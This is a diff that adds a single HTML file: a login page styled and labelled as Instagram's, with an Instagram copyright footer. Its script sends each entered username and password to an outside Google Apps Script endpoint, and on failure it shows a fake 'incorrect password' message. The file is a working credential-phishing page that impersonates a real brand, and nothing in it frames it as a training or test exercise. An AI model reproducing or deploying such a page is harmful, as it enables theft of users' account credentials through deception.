@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Instagram Style Form</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: linear-gradient(45deg, #833ab4, #fd1d1d, #fcb045);
+      background-size: 600% 600%;
+      animation: gradientBG 15s ease infinite;
+    }
+
+    @keyframes gradientBG {
+      0% {
+        background-position: 0% 50%;
+      }
+      50% {
+        background-position: 100% 50%;
+      }
+      100% {
+        background-position: 0% 50%;
+      }
+    }
+
+    .login-box {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+      width: 300px;
+    }
+
+    .login-box h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #333;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+      position: relative; /* needed for eye icon positioning */
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+      color: #555;
+    }
+
+    .form-group input[type="text"],
+    .form-group input[type="password"] {
+      width: 100%;
+      padding: 8px 35px 8px 8px; /* right padding for icon */
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+
+    /* Eye icon styles */
+    .toggle-password {
+      position: absolute;
+      top: 50%;
+      right: 10px;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 18px;
+      color: #888;
+      user-select: none;
+    }
+
+    .toggle-password:hover {
+      color: #333;
+    }
+
+    .btn {
+      display: flex;
+      justify-content: center;
+      margin-top: 15px;
+    }
+
+    .btn button {
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      background: #3897f0;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .btn button:hover {
+      background: #2675c6;
+    }
+
+    #message {
+      margin-top: 15px;
+      text-align: center;
+      font-weight: bold;
+      color: #000; /* default message color */
+    }
+
+    /* Error message style */
+    #error-message {
+      margin-top: 10px;
+      text-align: center;
+      color: red;
+      font-size: 0.85rem;
+      font-weight: normal;
+      display: none; /* hidden by default */
+    }
+
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 12px;
+      color: #aaa;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <h2>Instagram login page</h2>
+    <form id="form">
+      <div class="form-group">
+        <label for="ad-no">UserName</label>
+        <input type="text" name="UserName" placeholder="Phone number, username, or email" required />
+      </div>
+
+      <div class="form-group">
+        <label for="password">Password</label>
+        <input type="password" name="Password" id="password" placeholder="Password" required />
+        <span class="toggle-password" id="toggle-password" title="Show/Hide Password">&#128065;</span>
+        <!-- Using Unicode eye emoji 👁️ (&#128065;) as icon -->
+      </div>
+
+      <div class="btn">
+        <button type="submit" id="submit-button">Log In</button>
+      </div>
+    </form>
+
+    <div id="message"></div>
+    <div id="error-message">username or password is incorrect</div>
+
+    <div class="footer">&copy; 2025 Instagram</div>
+  </div>
+
+  <script>
+    // Toggle password visibility on eye icon click
+    document.getElementById("toggle-password").addEventListener("click", function () {
+      const passwordInput = document.getElementById("password");
+      if (passwordInput.type === "password") {
+        passwordInput.type = "text";
+        this.style.color = "#3897f0"; // change color to highlight when visible
+      } else {
+        passwordInput.type = "password";
+        this.style.color = "#888"; // default color
+      }
+    });
+
+    // Form submission handler
+    document.getElementById("form").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const form = e.target;
+      const formData = new FormData(form);
+
+      const submitBtn = document.getElementById("submit-button");
+      const messageBox = document.getElementById("message");
+      const errorBox = document.getElementById("error-message");
+
+      fetch(
+        "https://script.google.com/macros/s/AKfycbxeEtfow7yaiuF9f1gkM7naUoWC_zPOsm1Nh-vT5M8Q2nhfyTVToG6n873FR9l-alSo3w/exec",
+        {
+          method: "POST",
+          body: formData,
+        }
+      )
+        .then((response) => response.json())
+        .then((data) => {
+          if (data.status === "success") {
+            form.reset();
+            messageBox.textContent = data.message;
+            messageBox.style.color = "#000"; // black for success
+            errorBox.style.display = "none";
+          } else {
+            messageBox.textContent = "";
+            errorBox.style.display = "block";
+          }
+        })
+        .catch((error) => {
+          messageBox.textContent = "";
+          errorBox.style.display = "block";
+        })
+        .finally(() => {
+          submitBtn.disabled = false;
+        });
+    });
+  </script>
+</body>
+</html>
